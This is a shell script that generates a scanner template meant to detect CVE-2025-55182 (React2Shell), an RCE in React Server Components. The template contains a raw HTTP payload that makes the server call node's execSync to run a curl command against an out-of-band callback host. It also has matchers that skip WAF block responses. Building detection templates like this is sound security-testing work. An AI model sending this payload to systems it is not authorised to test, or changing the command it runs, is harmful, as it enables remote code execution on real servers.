#!/bin/bash
# K70n0s510 REACT2SHELL (CVE-2025-55182) BUILDER
# Targets the massive Dec 2025 RCE in React Server Components.

BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"
mkdir -p "$BASE_DIR/A100-2025-zero-days"

echo "⚛️ Building React2Shell Zero-Day Template..."

cat <<EOF > "$BASE_DIR/A100-2025-zero-days/CVE-2025-55182-react2shell.yaml"
id: CVE-2025-55182-react2shell
info:
  name: React2Shell (React Server Components RCE)
  author: K70n0s510
  severity: critical
  description: |
    Detects CVE-2025-55182 (React2Shell), a critical deserialization RCE in React Server Components (RSC).
    Affects React 19.x and Next.js 15.x by exploiting the "Flight" protocol serialization.
  reference:
    - https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
  tags: cve,cve2025,react,nextjs,rce,react2shell
http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        Next-Action: {{to_lower(rand_base(32))}}
        
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="1_action"
        
        ["\$K1"]
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="1_key"
        
        1:I["node:child_process",["execSync"],"execSync"]
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="1_args"
        
        ["curl http://{{interactsh-url}}"]
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    matchers-condition: and
    matchers:
      # OOB Check: Did we get a ping back?
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"

      # WAF PROTECTION: Ignore if Akamai/Cloudflare blocks the weird payload
      - type: word
        words: ["AkamaiGHost", "Access Denied", "Cloudflare"]
        negative: true
EOF

echo "✅ React2Shell (CVE-2025-55182) Template Built."
